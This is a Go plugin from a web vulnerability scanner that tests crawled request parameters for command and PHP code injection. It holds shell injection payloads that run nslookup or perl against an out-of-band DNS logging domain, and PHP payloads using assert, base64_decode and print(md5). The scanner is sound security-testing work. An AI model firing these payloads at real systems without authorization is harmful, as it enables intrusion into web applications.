package cmdinject

/**
  @author: yhy
  @since: 2023/1/30
  @desc: //TODO
**/
import (
	"github.com/thoas/go-funk"
	"github.com/yhy0/Jie/pkg/input"
	"github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/Jie/pkg/reverse"
	"github.com/yhy0/logging"
	"regexp"
	"strings"
	"time"
)

var domainPayloadList = []string{
	`|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
	// `&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&\'\\"`0&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&`\'`,
	`;(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")&(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
	"(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
	"$(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
	"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
}

func Scan(in *input.CrawlResult) {
	res, payload, isvul := startTesting(in)
	if isvul {
		output.OutChannel <- output.VulMessage{
			DataType: "web_vul",
			Plugin:   "CMD-INJECT",
			VulnData: output.VulnData{
				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
				Target:     in.Url,
				Method:     in.Method,
				Ip:         in.Ip,
				Param:      in.Kv,
				Request:    res.RequestDump,
				Response:   res.ResponseDump,
				Payload:    payload,
			},
			Level: output.Critical,
		}
	}

	logging.Logger.Debugf("cmd inject vulnerability not found")
}

func startTesting(in *input.CrawlResult) (*httpx.Response, string, bool) {
	variations, err := httpx.ParseUri(in.Url, []byte(in.RequestBody), in.Method, in.ContentType, in.Headers)
	if err != nil {
		logging.Logger.Errorln(err)
		return nil, "", false
	}

	if in.IsSensorServerEnabled {
		dnslog := reverse.GetSubDomain()

		if variations != nil {
			for _, p := range variations.Params {
				//todo 奇怪这里为什么会崩溃？
				for _, payload := range domainPayloadList {
					s1 := strings.ReplaceAll(payload, "{domain}", dnslog.Domain)

					originpayload := variations.SetPayloadByIndex(p.Index, in.Url, s1, in.Method)

					logging.Logger.Debugln("payload:", originpayload)

					var res *httpx.Response
					if in.Method == "GET" {
						res, err = httpx.Request(originpayload, in.Method, "", false, in.Headers)
					} else {
						res, err = httpx.Request(in.Url, in.Method, originpayload, false, in.Headers)
					}

					if err != nil {
						continue
					}

					if reverse.PullLogs(dnslog) {
						return res, originpayload, true
					}
				}
			}
		}

	}

	//if SensorServer has disable

	//PHP code injection
	var payloads = []string{
		`;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));`,
		`';print(md5(31337));$a='`,
		`\";print(md5(31337));$a=\"`,
		`${@print(md5(31337))}`,
		`${@print(md5(31337))}\\`,
		`'.print(md5(31337)).'`,
	}

	if variations != nil {
		for _, p := range variations.Params {
			for _, payload := range payloads {
				originpayload := variations.SetPayloadByIndex(p.Index, in.Url, payload, in.Method)

				var res *httpx.Response
				if in.Method == "GET" {
					res, err = httpx.Request(originpayload, in.Method, "", false, in.Headers)
				} else {
					res, err = httpx.Request(in.Url, in.Method, originpayload, false, in.Headers)
				}

				logging.Logger.Debugln("payload:", originpayload)
				if err != nil {
					continue
				}

				if funk.Contains(res.ResponseDump, "6f3249aa304055d63828af3bfab778f6") {
					return res, payload, true
				}
				var regexphp = `Parse error: syntax error,.*?\sin\s.*?\(\d+\).*?eval\(\)\'d\scode\son\sline\s<i>\d+<\/i>`
				re, _ := regexp.Compile(regexphp)
				result := re.FindString(res.ResponseDump)
				if result != "" {
					return res, payload, true
				}

			}
		}
	}

	return nil, "", false
}
